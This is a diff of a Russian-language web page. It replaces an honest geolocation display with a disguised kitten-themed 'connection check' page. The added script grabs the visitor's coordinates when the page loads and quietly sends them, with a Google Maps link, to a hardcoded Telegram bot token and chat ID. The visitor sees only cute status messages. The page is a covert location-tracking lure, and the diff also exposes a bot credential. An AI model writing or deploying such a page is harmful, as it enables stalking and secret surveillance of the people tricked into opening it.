@@ -1,47 +1,62 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Геолокация</title>
+  <meta charset="UTF-8">
+  <title>Загрузка...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    img {
+      width: 280px;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+    .message {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-    <h1>Отслеживание местоположения</h1>
-    <p id="location">Определяем местоположение...</p>
+  <img src="https://placekitten.com/300/300" alt="Котик" />
+  <div class="message" id="status">Мяу! Проверка соединения...</div>
 
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById("location").innerHTML = "Геолокация не поддерживается вашим браузером.";
-            }
-        }
+  <script>
+    function sendToTelegram(lat, lon) {
+      const message = `📍 Местоположение:\nШирота: ${lat}\nДолгота: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      fetch(`https://api.telegram.org/bot7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: "148031411",
+          text: message
+        })
+      }).then(() => {
+        document.getElementById("status").innerText = "Мяу! Всё отправлено 🐾";
+      }).catch(() => {
+        document.getElementById("status").innerText = "Ошибка отправки 🐾";
+      });
+    }
 
-        function showPosition(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            document.getElementById("location").innerHTML = `Ваше местоположение: Широта: ${lat}, Долгота: ${lon}`;
-        }
+    function handlePosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      sendToTelegram(lat, lon);
+    }
 
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "Пользователь отклонил запрос на геолокацию.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Информация о местоположении недоступна.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "Запрос на определение местоположения истёк.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "Произошла неизвестная ошибка.";
-                    break;
-            }
-        }
+    function handleError(error) {
+      document.getElementById("status").innerText = "Котик не смог найти GPS 😿";
+    }
 
-        getLocation();
-    </script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(handlePosition, handleError);
+    } else {
+      document.getElementById("status").innerText = "Ваш браузер не поддерживает геолокацию 🐾";
+    }
+  </script>
 </body>
 </html>
